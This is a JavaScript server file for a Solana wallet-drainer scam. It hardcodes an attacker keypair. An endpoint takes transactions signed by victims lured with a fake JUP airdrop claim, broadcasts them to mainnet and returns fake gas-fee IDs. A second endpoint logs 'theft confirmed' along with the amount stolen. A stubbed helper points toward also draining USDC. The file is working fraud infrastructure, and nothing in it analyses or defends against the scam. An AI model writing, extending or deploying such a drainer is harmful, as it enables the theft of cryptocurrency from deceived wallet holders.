// server.js - Backend for Solana transaction handling
const express = require('express');
const { Connection, Transaction, Keypair, sendAndConfirmTransaction } = require('@solana/web3.js');
const bs58 = require('bs58');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));

// Attacker Solana wallet (where funds go)
const ATTACKER_KEYPAIR = Keypair.fromSecretKey(
    bs58.decode('prVPrLRQwqba4BZ4zTSQRChWMLmDprkfXLQPNTT9rL4z3dU1x4cSe5NkokGaFaCQyJBZ4CUahoUFZBipdFkXG')
);

const connection = new Connection('https://api.mainnet-beta.solana.com');

// Endpoint to collect malicious transactions
app.post('/collect', async (req, res) => {
    const { wallet, signedTx, balances, fakeAmount, timestamp } = req.body;
    
    console.log(`[+] New victim: ${wallet}`);
    console.log(`[+] Balance: SOL=${balances.SOL}, USDC=${balances.USDC}`);
    console.log(`[+] Fake claim amount: ${fakeAmount} JUP`);
    console.log(`[+] Timestamp: ${timestamp}`);
    
    try {
        // Decode the base64 signed transaction
        const tx = Transaction.from(Buffer.from(signedTx, 'base64'));
        
        // Broadcast to network
        const txid = await sendAndConfirmTransaction(connection, tx, []);
        console.log(`[+] Malicious transaction sent: ${txid}`);
        
        // Generate fake gas fee transaction ID
        const fakeGasTxId = 'fake' + Math.random().toString(36).substring(2, 15);
        
        // If USDC balance exists, prepare secondary transfer
        if (balances.USDC > 0) {
            console.log(`[+] USDC detected: ${balances.USDC}`);
            // transferUSDC(wallet, balances.USDC);
        }
        
        res.json({
            success: true,
            txid: txid,
            gasTxId: fakeGasTxId,
            message: 'Transaction processed'
        });
    } catch (e) {
        console.error(`[-] Failed to process transaction: ${e.message}`);
        res.status(400).json({
            success: false,
            error: e.message
        });
    }
});

// Endpoint to confirm theft completion
app.post('/confirm', async (req, res) => {
    const { wallet, txId, amount, timestamp } = req.body;
    
    console.log(`[+] THEFT CONFIRMED`);
    console.log(`[+] Wallet: ${wallet}`);
    console.log(`[+] Amount stolen: ${amount} SOL`);
    console.log(`[+] Transaction: ${txId}`);
    console.log(`[+] Timestamp: ${timestamp}`);
    
    // Log to file or database
    // storeVictimData(wallet, amount, txId, timestamp);
    
    res.json({
        success: true,
        message: 'Theft logged successfully'
    });
});

// Helper function for USDC transfer
function transferUSDC(fromAddress, amount) {
    // USDC token transfer instruction
    // ...
    console.log(`[*] USDC transfer pending: ${amount} from ${fromAddress}`);
}

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ status: 'Backend running', timestamp: new Date().toISOString() });
});

// Start server
const port = process.env.PORT || 3000;

app.listen(port, () => {
    console.log(`✅ Backend running: http://localhost:${port}`);
    console.log(`📝 Listening for victim transactions...`);
});
